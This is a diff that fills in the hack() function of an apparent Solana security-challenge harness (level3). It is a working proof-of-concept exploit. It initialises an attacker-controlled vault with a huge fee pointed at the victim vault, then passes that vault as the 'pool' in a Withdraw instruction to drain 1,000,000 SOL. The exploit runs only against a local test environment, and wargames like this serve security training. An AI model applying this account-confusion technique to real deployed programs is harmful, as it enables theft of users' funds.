@@ -1,6 +1,6 @@
 use std::{env, str::FromStr};
 
-use level3::{TipPool, TIP_POOL_LEN};
+use level3::{TipPool, TIP_POOL_LEN, initialize, TipInstruction};
 
 use owo_colors::OwoColorize;
 use poc_framework::solana_sdk::signature::Keypair;
@@ -11,6 +11,8 @@ use solana_program::native_token::lamports_to_sol;
 
 use pocs::assert_tx_success;
 use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};
+use solana_program::instruction::{AccountMeta, Instruction};
+use borsh::BorshSerialize;
 
 #[allow(dead_code)]
 struct Challenge {
@@ -24,7 +26,39 @@ struct Challenge {
 }
 
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {}
+fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
+
+    // @note - Hack steps
+    // 1) Create Vault for hacker, creator = hacker, fee = u64::MAX as f64, fee_recipient = rich_boy_vault
+    // 2) Make withdraw with pool = hacker_vault, withdrawal_authority = hacker
+    let seed: u8 = 1;
+    let hacker_vault_address = Pubkey::create_program_address(&[&[seed]], &challenge.tip_program).unwrap();
+    let hacker_vault_ix = initialize(challenge.tip_program, hacker_vault_address, challenge.hacker.pubkey(), seed, u64::MAX as f64, challenge.vault_address);
+
+    assert_tx_success(
+        env.execute_as_transaction(
+            &[hacker_vault_ix],
+            &[&challenge.hacker],
+        )
+    );
+
+    let exploit_withdraw_ix = Instruction {
+        program_id: challenge.tip_program,
+        accounts: vec![
+            AccountMeta::new(challenge.vault_address, false), // vault
+            AccountMeta::new(hacker_vault_address, false), // pool
+            AccountMeta::new( challenge.hacker.pubkey(), true), // withdrawal_authority
+            AccountMeta::new_readonly(system_program::id(), false),
+        ],
+        data: TipInstruction::Withdraw { amount: sol_to_lamports(1_000_000.0) }.try_to_vec().unwrap(),
+    };
+    assert_tx_success(
+        env.execute_as_transaction(
+            &[exploit_withdraw_ix],
+            &[&challenge.hacker],
+        )
+    );
+}
 
 /*
 SETUP CODE BELOW
@@ -105,7 +139,7 @@ fn setup() -> (LocalEnvironment, Challenge, Internal) {
         dir.push("level3.so");
         dir.to_str()
     }
-    .unwrap();
+        .unwrap();
 
     let tip_program = Pubkey::from_str("T1p1111111111111111111111111111111111111111").unwrap();
     let initizalizer = keypair(0);
